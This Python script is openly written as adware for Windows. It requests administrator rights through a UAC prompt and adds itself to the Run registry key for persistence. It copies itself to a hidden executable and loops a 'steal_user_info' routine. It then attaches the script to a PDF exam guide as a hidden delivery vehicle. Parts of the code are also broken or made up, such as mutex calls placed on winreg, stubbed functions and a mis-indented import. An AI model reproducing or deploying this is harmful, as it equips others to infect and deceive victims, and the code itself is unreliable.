import os
import sys
import time
import shutil
import winreg
import ctypes
import win32api
import win32con
import win32gui
import win32ui
import logging
from bs4 import BeautifulSoup
import requests
from PyPDF2 import PdfFileReader, PdfFileWriter

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Function to steal user information
def steal_user_info():
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, winreg.KEY_READ)
        value, _ = winreg.QueryValueEx(key, "Adware")
        winreg.CloseKey(key)
        logging.info("User information stolen: %s", value)
    except Exception as e:
        logging.error("Error stealing user information: %s", str(e))

# Function to inject advertisements
def inject_advertisements():
    try:
        url = "https://www.example.com"
        response = requests.get(url)
        soup = BeautifulSoup(response.content, "html.parser")
        # Inject advertisements into the HTML using BeautifulSoup
        # Example: soup.find("div", {"id": "ad-container"}).append("<div>Advertisement</div>")
        logging.info("Advertisements injected into web pages")
    except Exception as e:
        logging.error("Error injecting advertisements: %s", str(e))

# Function to modify system settings
def modify_system_settings():
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "Adware", 0, winreg.REG_SZ, "C:\\Adware.exe")
        winreg.CloseKey(key)
        logging.info("System settings modified")
    except Exception as e:
        logging.error("Error modifying system settings: %s", str(e))

# Function to evade detection and persistence
def evade_detection():
    try:
        # Implement techniques to ensure the adware remains active and undetectable
        shutil.copy(sys.executable, "C:\\Adware.exe")
        win32api.SetFileAttributes("C:\\Adware.exe", win32con.FILE_ATTRIBUTE_HIDDEN)
        logging.info("Adware evasion techniques applied")
    except Exception as e:
        logging.error("Error applying adware evasion techniques: %s", str(e))

# Main function to run the adware
def run_adware():
    while True:
        steal_user_info()
        inject_advertisements()
        modify_system_settings()
        evade_detection()
        time.sleep(60)  # Run every 60 seconds

# Entry point
if __name__ == '__main__':
    try:
        if not ctypes.windll.shell32.IsUserAnAdmin():
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
            sys.exit()

        mutex = winreg.CreateMutex(None, True, "AdwareMutex")
        if winreg.GetLastError() == winreg.ERROR_ALREADY_EXISTS:
            sys.exit()

        run_adware()
    except Exception as e:
        logging.error("Error running adware: %s", str(e))

# Open the PDF file
pdf_file = PdfFileReader("C:/Users/ganat/Downloads/Software_Engineering_Exam_Guide.pdf")

# Create a new PDF file with the adware script attached
output_pdf = PdfFileWriter()
output_pdf.appendPagesFromReader(pdf_file)

# Add the adware script as an attachment
with open("adware.py", "rb") as adware_file:
    output_pdf.addAttachment("adware.py", adware_file.read())

# Save the new PDF file
with open("output.pdf", "wb") as output_file:
    output_pdf.write(output_file)

    from pdfminer.high_level import extract_pages
from pdfminer.layout import LTTextContainer, LTTextLine

def check_pdf_attachments(pdf_path):
    for page_layout in extract_pages(pdf_path):
        for element in page_layout:
            if isinstance(element, LTTextContainer):
                for text_line in element:
                    if isinstance(text_line, LTTextLine):
                        print(text_line.get_text())

# Check for attachments
check_pdf_attachments("output.pdf")